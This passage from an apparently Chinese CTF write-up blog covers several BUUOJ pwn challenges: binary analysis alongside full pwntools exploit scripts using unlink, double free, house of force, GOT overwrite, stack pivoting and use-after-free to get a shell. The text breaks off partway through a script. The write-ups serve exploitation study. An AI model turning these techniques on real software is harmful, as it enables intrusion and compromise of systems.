class="hljs-string">&quot;index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;size:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;gift: &quot;</span>)<br>	addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">7</span>),<span class="hljs-number">16</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;content:\n&quot;</span>)<br>	p.send(content)<br>	<span class="hljs-keyword">return</span> addr<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;4.show\n&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;content:\n&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;4.show\n&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;4.show\n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>ptr = <span class="hljs-number">0x602118</span><br>key = <span class="hljs-number">0x00000000006022B8</span><br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>	add(i,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;\x07&#x27;</span> * <span class="hljs-number">0xf0</span>)<br>heap_addr = add(<span class="hljs-number">7</span>,<span class="hljs-number">0x88</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>log,success(<span class="hljs-string">&quot;heap_addr==&gt;0x%x&quot;</span> %heap_addr)<br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-string">&quot;b&quot;</span>)<br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;c&quot;</span>)<br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">7</span>):<br>	free(i)<br><span class="hljs-comment">#unlink</span><br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x81</span>) <br>fake_chunk += p64(ptr - <span class="hljs-number">0x18</span>) + p64(ptr - <span class="hljs-number">0x10</span>)<br>fake_chunk += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x80</span>)<br>edit(<span class="hljs-number">7</span>,fake_chunk)<br>free(<span class="hljs-number">8</span>)<br><br>payload = p64(heap_addr + <span class="hljs-number">0x190</span>) * <span class="hljs-number">2</span> + p64(free_got) + p64(ptr - <span class="hljs-number">0x18</span>)<br>edit(<span class="hljs-number">7</span>,payload)<br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">5</span>) <span class="hljs-comment">#double free</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,p64(key))<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x80</span>,p32(<span class="hljs-number">5</span>) + p32(<span class="hljs-number">5</span>))<br>show(<span class="hljs-number">6</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br>log.success(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload = p64(free_hook) * <span class="hljs-number">3</span> + p64(ptr - <span class="hljs-number">0x18</span>)<br>edit(<span class="hljs-number">7</span>,payload)<br>edit(<span class="hljs-number">5</span>,p64(system))<br>free(<span class="hljs-number">10</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h3 id="六十九、lctf2016-pwn200"><a href="#六十九、lctf2016-pwn200" class="headerlink" title="六十九、lctf2016_pwn200"></a>六十九、lctf2016_pwn200</h3><p><img src="/2021/04/07/2021-04-07-buu03/image-20210905105020439.png"><span class="image-caption">image-20210905105020439</span></p>
<p>常规checksec一下，64位，保护几乎都没开启</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210905105059956.png"><span class="image-caption">image-20210905105059956</span></p>
<p>进入IDA，进入的第一个函数就存在问题，这边最长输入0x30的字符，但是v2距离rbp的距离也是0x30，所以可以借此打印出rbp的值，得到栈上地址，那么应该就是ret2shellcode了</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210905105342837.png"><span class="image-caption">image-20210905105342837</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210905105242460.png"><span class="image-caption">image-20210905105242460</span></p>
<p>再往下看，这边存在任意地址写</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210905110435529.png"><span class="image-caption">image-20210905110435529</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210905110553881.png"><span class="image-caption">image-20210905110553881</span></p>
<p>计算一下偏移</p>
<p>然后通过任意地址写往free@got表里写入前面算好的shellcode的地址，再执行到后面程序中的free函数，然后跳转到写好的shellcode执行</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210905112409521.png"><span class="image-caption">image-20210905112409521</span></p>
<p>getshell！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25517</span>)<br><span class="hljs-comment">#p = process(&#x27;./pwn200&#x27;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn200&#x27;</span>)<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><span class="hljs-comment">#gdb.attach(p,&#x27;b *main&#x27;)</span><br><br>p.recvuntil(<span class="hljs-string">&quot;who are u?\n&quot;</span>)<br>shellcode = asm(shellcraft.sh())<br>p.send(shellcode.ljust(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;a&#x27;</span>))<br>leak_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">80</span><br>log.info(<span class="hljs-built_in">hex</span>(leak_addr))<br>p.recvuntil(<span class="hljs-string">&quot;give me your id ~~?&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;give me money~\n&quot;</span>)<br>payload = p64(leak_addr) + <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x30</span> + p64(free_got)<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&#x27;choice :&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="七十、pwnable-simple-login"><a href="#七十、pwnable-simple-login" class="headerlink" title="七十、pwnable_simple_login"></a>七十、pwnable_simple_login</h3><p><img src="/2021/04/07/2021-04-07-buu03/image-20210910105207938.png"><span class="image-caption">image-20210910105207938</span></p>
<p>常规checksec，开了NX、Canary。但是到IDA里面发现，没看到Canary的踪迹</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210910105257032.png"><span class="image-caption">image-20210910105257032</span></p>
<p>IDA里面有后门函数</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210910105318680.png"><span class="image-caption">image-20210910105318680</span></p>
<p>base64解码函数里面有些复杂，看的很难受，但是我们可以通过程序逻辑进行判断，返回的应该是长度，因为底下进行了比大小；而s是我们输入的值没什么好说，就是要输入一个base64的值让他再解码成正常值；v5则应该是解码后的值，因为底下把v5的值写入了input里面。但是如果是要以程序逻辑执行到后门函数的话，我也不知道行不行，反正我是不会的。想的肯定是有没有哪里有溢出，跳到后门函数就行了。</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210910105421986.png"><span class="image-caption">image-20210910105421986</span></p>
<p>找了找，在auth函数里面，memcpy可以溢出了，因为size最大可以为12，而v4距离返回值偏移也为12，似乎不够，只能覆盖到ebp，不过可以发现，在这个函数里面执行一次leave ret，然后这个函数退出了，到main函数，刚好又将会继续执行leave ret。所以其实就是一种栈迁移，把栈迁移到.bss上去，然后执行后门函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25575</span>)<br>shell = <span class="hljs-number">0x08049284</span><br>input_addr = <span class="hljs-number">0x0811EB40</span><br>p.recvuntil(<span class="hljs-string">&quot;Authenticate : &quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + p32(shell) + p32(input_addr)<br>p.sendline(payload.encode(<span class="hljs-string">&#x27;base64&#x27;</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h3 id="七十一、gyctf-2020-force"><a href="#七十一、gyctf-2020-force" class="headerlink" title="七十一、gyctf_2020_force"></a>七十一、gyctf_2020_force</h3><p><img src="/2021/04/07/2021-04-07-buu03/image-20210916151101226.png"><span class="image-caption">image-20210916151101226</span></p>
<p>常规checksec一下，64位保护全开</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210916153042695.png"><span class="image-caption">image-20210916153042695</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210916153101689.png"><span class="image-caption">image-20210916153101689</span></p>
<p>进入IDA，总共就两个功能：一个是申请堆块，堆块大小无限制，并且能返回给堆地址，然后填入内容是固定长度0x50；另外一个puts功能。。。屁用没有！根据题目提示想到house of force</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210916163309864.png"><span class="image-caption">image-20210916163309864</span></p>
<p>因为程序会返回堆的地址，程序又不限制堆块的大小，所以我们可以申请一个大于top chunk的堆块，那么程序就会调用mmap进行分配堆块，此时堆块的地址会是libc中的一个地址</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210916163532720.png"><span class="image-caption">image-20210916163532720</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210916205725583.png"><span class="image-caption">image-20210916205725583</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210916205619022.png"><span class="image-caption">image-20210916205619022</span></p>
<p>然后申请一个小于0x50的堆块，让堆块能进行溢出覆盖top chunk的size位，修改为-1（也就是0xFFFFFFFFFFFFFFFF），同时也借着这个堆块能获取到top chunk的地址。修改完-1，因为使用malloc申请堆块时验证size的类型是无符号数，所以我们可以分配很大的堆块也仍然可以通过验证，借此直接申请一个超大堆块，直接占满top chunk与__malloc_hook之间长度，然后再申请一个堆块去修改hook的为one_gadget即可</p>
<p>然后呢。offse至少t减0x30，因为我们申请的堆块是有堆头，并且是要覆盖两个hook</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210916201004797.png"><span class="image-caption">image-20210916201004797</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210916201128484.png"><span class="image-caption">image-20210916201128484</span></p>
<p>最后的调整我有些理解不了，明明指向不是0，但最后却能getshell，只能说明应该是在最后执行完malloc后，rsp又被调整了吧</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./gyctf_2020_force&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28894</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;2:puts\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;size\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>	addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;content\n&quot;</span>)<br>	p.send(content)<br>	<span class="hljs-keyword">return</span> addr<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;2:puts\n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>libc_base = add(<span class="hljs-number">0x200000</span>,<span class="hljs-string">&#x27;a&#x27;</span>) + <span class="hljs-number">0x200ff0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg = libc_base + <span class="hljs-number">0x4527a</span><br>realloc = libc_base + libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>top_chunk = add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>)) + <span class="hljs-number">0x10</span> <br>log.info(<span class="hljs-string">&quot;top_chunk==&gt;0x%x&quot;</span> %top_chunk)<br>offset = mlh - top_chunk<br>add(offset-<span class="hljs-number">0x33</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + p64(ogg) + p64(realloc + <span class="hljs-number">0x10</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;2:puts\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;size\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x10</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="七十二、pwnable-hacknote"><a href="#七十二、pwnable-hacknote" class="headerlink" title="七十二、pwnable_hacknote"></a>七十二、pwnable_hacknote</h3><p><img src="/2021/04/07/2021-04-07-buu03/image-20210923153219237.png"><span class="image-caption">image-20210923153219237</span></p>
<p>常规checksec，32位，没开全RELRO，PIE。猜测可以劫持got表</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210923153712466.png"><span class="image-caption">image-20210923153712466</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210923153919700.png"><span class="image-caption">image-20210923153919700</span></p>
<p>在申请堆块功能里，发现一个有意思的东西，把一个调用puts的函数的地址赋值给了堆块内容，猜测打印功能就是直接使用这个函数指针，那么就可以试着修改这个指针，改为system，再把堆块内容修改为/bin/sh</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210923153939335.png"><span class="image-caption">image-20210923153939335</span></p>
<p>果然，直接调用了函数指针</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210923153908205.png"><span class="image-caption">image-20210923153908205</span></p>
<p>释放功能，指针没有置零，存在UAF</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210923193256099.png"><span class="image-caption">image-20210923193256099</span></p>
<p>第一步是获取libc，我的做法是借着释放unsorted chunk产生libc，然后再申请回来，覆盖fd指针为aaaa作为定位，然后将bk指针打印出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&quot;;sh\x00&quot;</span>) <span class="hljs-comment">#1</span><br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#2</span><br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>libc_base = u32(p.recv(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x1B37B0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>log.info(<span class="hljs-built_in">hex</span>(system))<br></code></pre></td></tr></table></figure>

<p><img src="/2021/04/07/2021-04-07-buu03/image-20210923193522763.png"><span class="image-caption">image-20210923193522763</span></p>
<p>然后就是修改函数指针，把函数指针改成指向system的，通过连续释放两个堆块，然后再申请回来（大小是0x8的），那么就会有一个堆块是之前可以调用show功能的堆块，修改这个堆块的内容为system地址，以及”;sh\x00”（或是”||sh”），因为上图传入的参数其实是函数指针的地址，所以要用<code>；</code>或者<code>||</code>才能也执行到sh而获取到shell，然后借着UAF执行show功能getshell</p>
<p>最后，我换了网上的做法，我前面使用unsorted chunk泄露libc可能远程有点不同，导致没能打通，只有本地通了</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210924081921009.png"><span class="image-caption">image-20210924081921009</span></p>
<p>然后我去实验了一下，发现远程的地址比本地的多了0x300，我打了五六次都是差0x300，之前做buu的堆题获取libc的方式，我已经记不清了，因为buu上的libc是被动过的libc，所以我本地打的时候加载的并不是和buu一模一样的libc，可能这就是因为小版本之间的差异吧，不过根据这次来看，版本之间的小差异，对算libc偏移造成的影响应该是比较小的，前后多试几个0xn00，说不定能行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/libc-2.23.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">26554</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Note size :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;Content :&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>puts = <span class="hljs-number">0x804862b</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&quot;aaaa&quot;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&quot;bbbb&quot;</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x8</span>, p32(puts) + p32(read_got))<br>show(<span class="hljs-number">0</span>)<br>read = u32(p.recv(<span class="hljs-number">4</span>))<br>system = read - libc.symbols[<span class="hljs-string">&quot;read&quot;</span>] + libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>success(<span class="hljs-built_in">hex</span>(system))<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">8</span>, p32(system) + <span class="hljs-string">&quot;;sh\x00&quot;</span>)<br>show(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="七十三、ciscn-2019-final-4"><a href="#七十三、ciscn-2019-final-4" class="headerlink" title="七十三、ciscn_2019_final_4"></a>七十三、ciscn_2019_final_4</h3><p><img src="/2021/04/07/2021-04-07-buu03/image-20211007190521092.png"><span class="image-caption">image-20211007190521092</span></p>
<p>checksec一下，64位，没开PIE</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20211007191435082.png"><span class="image-caption">image-20211007191435082</span></p>
<p>delete函数里面存在UAF</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20211007191927917.png"><span class="image-caption">image-20211007191927917</span></p>
<p>禁用了execve，所以得要rop读取flag</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20211007192957739.png"><span class="image-caption">image-20211007192957739</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20211007193057775.png"><span class="image-caption">image-20211007193057775</span></p>
<p>似乎无法调试这题，去百度了一下<a href="https://blog.csdn.net/seaaseesa/article/details/105855306%EF%BC%8C%E5%8E%9F%E6%9D%A5%E5%89%8D%E9%9D%A2%E7%9A%84%E4%BB%A3%E7%A0%81%E9%83%BD%E6%98%AF%E4%B8%BA%E4%BA%86%E8%AE%A9%E6%88%91%E4%BB%AC%E6%97%A0%E6%B3%95%E8%B0%83%E8%AF%95%E7%9A%84%E3%80%82%60ptrace%60">https://blog.csdn.net/seaaseesa/article/details/105855306，原来前面的代码都是为了让我们无法调试的。`ptrace`</a> 提供了一种机制使得父进程可以观察和控制子进程的执行过程。父进程 fork() 出子进程，子进程中执行我们所想要 trace 的程序，在子进程调用 exec() 之前，子进程需要先调用一次 ptrace，以 PTRACE_TRACEME 为参数。</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20211007193646167.png"><span class="image-caption">image-20211007193646167</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20211007193755639.png"><span class="image-caption">image-20211007193755639</span></p>
<p>所以调试的子进程已经被占用，导致我们无法再生成一个，所以要让这段程序失效，根据师傅的做法是修改汇编代码为<code>jmp $+0x9E</code>，直接跳转到后面的函数去执行，从而避免占用子进程</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20211007194639451.png"><span class="image-caption">image-20211007194639451</span></p>
<p>用keypatch这样改不了。。。</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20211007195234222.png"><span class="image-caption">image-20211007195234222</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20211007195506179.png"><span class="image-caption">image-20211007195506179</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20211007195609719.png"><span class="image-caption">image-20211007195609719</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20211007195846918.png"><span class="image-caption">image-20211007195846918</span></p>
<p>所以模仿师傅的做法，修改机器码，把对应的机器码修改为上述的e999000000即可，然后就能调试了。</p>
<p>然后说下思路，大方向是orw读取flag，网上师傅的wp是利用前面给的栈地址进行伪造一个堆头，让后续的堆块可以分配过去控制返回地址（并且栈地址还得先要泄露出来），但是因为程序是个死循环，所以还要劫持里面的函数的返回地址，让程序真正的退出，才能去执行布置的rop。我觉得有点麻烦了，不如使用劫持malloc_hook为setcontext + 53，不用劫持这么多的。</p>
<p>好吧，我是沙比，忘了malloc的第一个参数是传入的size，兴冲冲要读flag，看到gdb里面rdi值是0xd0，人傻了，这题本来的做法太麻烦了，我不做了，溜了溜了</p>
<p>那就总结一下思路吧，防止以后比赛遇到了，也能有印象顺着做，慢慢调试</p>
<ul>
<li><p>首先，反调试，可以选择修改ida里面的汇编指令，让反调试的程序不被执行到，从而可以调试。而机器指令可以用pwntools得到</p>
</li>
<li><p>其次，如果可以输入栈的内容，在里面布置堆头，由此推广，在可以输入的地方都可以布置出堆头，让我们可以通过size检查，。当然这仅仅是2.23的版本，之后的版本都不用检查size的。当然布置完堆头就要获得堆头对应的地址</p>
</li>
<li><p>然后，就是environ存着一个栈地址（虽然我本来就知道，当做是复习吧）。布置rop时长度不够写，可以先执行read函数，加长可写的长度</p>
</li>
<li><p>最后，如果程序不退出，可以修改某个函数的返回地址，我们让程序执行到返回地址，执行我们布置好的rop</p>
<p>over！</p>
</li>
</ul>
<p>留下个错误脚本，跑路！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;info&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ciscn_final_4&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;&quot;,)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b *0x0000000000400B2F&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span 